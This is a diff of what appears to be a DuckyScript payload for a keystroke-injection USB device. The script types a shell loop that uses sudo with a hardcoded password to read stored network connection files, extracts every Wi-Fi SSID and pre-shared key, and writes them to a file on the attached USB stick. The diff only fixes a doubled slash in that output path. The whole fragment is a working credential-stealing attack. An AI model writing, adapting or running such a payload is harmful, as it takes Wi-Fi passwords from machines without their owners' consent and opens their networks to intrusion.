@@ -6,7 +6,7 @@ STRING for FILE in *;
 ENTER
 STRING do echo -e "$(sudo <<< "password" cat "$FILE" | grep -oP '(?<=ssid=).*') \t\t\t\t  $(sudo <<< "password" cat "$FILE" | grep -oP '(?<=psk=).*')"
 ENTER
-STRING done >> /media/$(hostname)/UsbStick//wifi_pass.txt
+STRING done >> /media/$(hostname)/UsbStick/wifi_pass.txt
 ENTER
 STRING exit
 ENTER
